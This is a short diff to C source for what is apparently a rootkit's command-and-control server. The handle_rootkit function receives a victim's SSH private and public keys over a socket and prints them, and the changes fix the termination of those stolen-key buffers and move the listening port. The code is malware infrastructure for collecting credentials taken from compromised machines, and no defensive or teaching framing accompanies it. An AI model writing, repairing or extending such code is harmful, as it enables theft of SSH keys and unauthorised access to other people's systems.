@@ -19,7 +19,7 @@ void handle_rootkit(int rootkitSocket) {
         ssize_t bytesFromClient;
 
         //Private Key
-        char sshData[2635]; //Add 1 for null byte, actually 2635+595 + 1
+        char sshData[2635]; //Add 1 for null byte, actually 2635 + 1
         int sshSum = 0;
         int sshDataBufferCount = 0;
 
@@ -32,8 +32,8 @@ void handle_rootkit(int rootkitSocket) {
                 sshData[sshDataBufferCount++] = sshDataTempBuffer[t];
             }
         }
-        // sshData[2636] = '\0';
-        printf("%s", sshData);
+        sshData[2634] = '\0';
+        printf("%s\n", sshData);
 
         char random[2];
         bytesFromClient = recv(rootkitSocket, random, 2, 0);
@@ -53,8 +53,8 @@ void handle_rootkit(int rootkitSocket) {
                 sshDataPublic[sshDataBufferCountPublic++] = sshDataTempBufferPublic[t];
             }
         }
-        // sshDataPublic[596] = '\0';
-        printf("%s", sshDataPublic);
+        sshDataPublic[594] = '\0';
+        printf("%s\n", sshDataPublic);
         
         bytesFromClient = recv(rootkitSocket, random, 2, 0);
     }
@@ -69,7 +69,7 @@ int main(int argc, char *argv[]){
     memset(&cncAddress, 0, sizeof(cncAddress));
     cncAddress.sin_family = AF_INET;
     cncAddress.sin_addr.s_addr = htonl(INADDR_ANY);
-    cncAddress.sin_port = htons(9021);
+    cncAddress.sin_port = htons(9024);
 
     //Create a socket
     int cncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
